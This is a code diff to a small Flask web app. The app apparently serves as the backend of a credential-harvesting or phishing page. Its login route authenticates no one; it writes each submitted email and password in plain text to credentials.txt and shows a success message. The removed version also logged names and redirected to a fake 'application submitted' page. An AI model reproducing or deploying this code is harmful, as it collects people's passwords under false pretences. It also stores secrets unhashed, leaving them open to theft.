@@ -1,5 +1,4 @@
-from flask import Flask, render_template, request, redirect
-import datetime
+from flask import Flask, render_template, request
 import os
 
 app = Flask(__name__)
@@ -10,23 +9,15 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    name = request.form['name']
     email = request.form['email']
     password = request.form['password']
+    
+    # Save to a text file (will not work on Railway, just for local testing)
+    with open("credentials.txt", "a") as f:
+        f.write(f"{email} | {password}\n")
+    
+    return "Login submitted successfully!"
 
-    with open("credentials.txt", "a") as file:
-        file.write(f"{datetime.datetime.now()} - Name: {name}, Email: {email}, Password: {password}\n")
-
-    return redirect("/dashboard")
-
-@app.route('/dashboard')
-def dashboard():
-    return "<h1 style='text-align:center;'>🎉 Application Submitted Successfully!</h1><p style='text-align:center;'>We will contact you soon.</p>"
-
-import os
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))
-    print(f"Running on port {port}")
-
-    app.run(host="0.0.0.0", port=port)
+    app.run(host='0.0.0.0', port=port)
